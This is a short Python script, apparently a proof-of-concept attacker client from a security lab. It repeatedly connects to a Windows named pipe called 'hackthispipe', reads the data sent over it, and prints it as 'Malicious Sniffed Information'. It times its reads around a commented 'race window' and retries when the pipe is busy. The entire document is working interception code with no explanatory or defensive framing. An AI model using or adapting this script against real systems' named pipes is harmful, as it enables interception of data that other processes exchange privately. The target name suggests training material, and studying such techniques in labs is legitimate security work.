import win32file
import pywintypes
import time

pipe_name = r'\\.\pipe\hackthispipe'

while True:
    try:
        pipe = win32file.CreateFile(
            pipe_name,
            win32file.GENERIC_READ,
            0,
            None,
            win32file.OPEN_EXISTING,
            0,
            None) 
        message = win32file.ReadFile(pipe, 4096)[1]
        print("Malicious Sniffed Information: ")
        print(message.decode().strip())
        time.sleep(2)  # Wait for a Race Window
        win32file.CloseHandle(pipe)
    except pywintypes.error as e:
        if e.args[0] == 231:  # ERROR_PIPE_BUSY
            print("Pipe is busy, retrying...")
            time.sleep(1)  # Wait for the next attempt
            continue
        elif e.args[0] == 2:
            print("Server is not running")
            break
        else:
            print("Error:", e)
            break
